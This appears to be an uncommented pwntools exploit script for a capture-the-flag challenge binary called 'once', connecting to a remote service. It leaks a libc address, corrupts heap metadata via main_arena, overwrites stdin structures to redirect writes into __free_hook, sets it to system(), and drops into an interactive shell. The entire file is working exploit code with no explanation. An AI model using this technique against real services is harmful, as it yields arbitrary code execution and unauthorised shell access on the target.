from pwn import *

debug=0
e=ELF('./libc.so')
if debug:
    p=process('once',env={'LD_PRELOAD':'./libc.so'})
    context.log_level='debug'
    gdb.attach(p)
else:
    p=remote('47.75.189.102', 9999)

def ru(x):
    return p.recvuntil(x)

def se(x):
    p.send(x)


def gift():
    se('0\n')
    ru('Invalid choice\n')
    base=int(p.recv(14),16)-e.symbols['puts']
    return base

def alloc():
    se('1\n')
    ru('suceess')

def change(content):
    se('2\n')
    sleep(0.5)
    se(content)
    ru('success')

def next():
    se('3\n')
    ru('success')


def trigger():
    se('4\n')
    sleep(0.5)

def trigger_read(content):
    se('2\n')
    sleep(0.5)
    se(content)
    ru('>')

def trigger_malloc(sz):
    se('1\n')
    ru('input size:')
    se(str(sz)+'\n')
    ru('>')

def trigger_end():
    se('4\n')
    ru('>')



base=gift()

main_arena=0x3C4B78+base

bss_start=base+0x3C5620
stdin=base+0x3C48E0

free_hook=base+e.symbols['__free_hook']

binsh=base+e.search('/bin/sh').next()

change(p64(1)+p64(0x20fe1)+p64(main_arena-0x10)*2)

alloc()

next()

trigger()

trigger_malloc(400)

payload=p64(free_hook)*2+p64(bss_start)+p64(0)+p64(stdin)+p64(0)*2
payload+=p64(binsh)+p32(0)+p32(0x100)+p64(0)

trigger_read(payload)

trigger_end()

change(p64(base+e.symbols['system']))

se('4\n')
sleep(0.5)
se('3\n')

p.interactive()
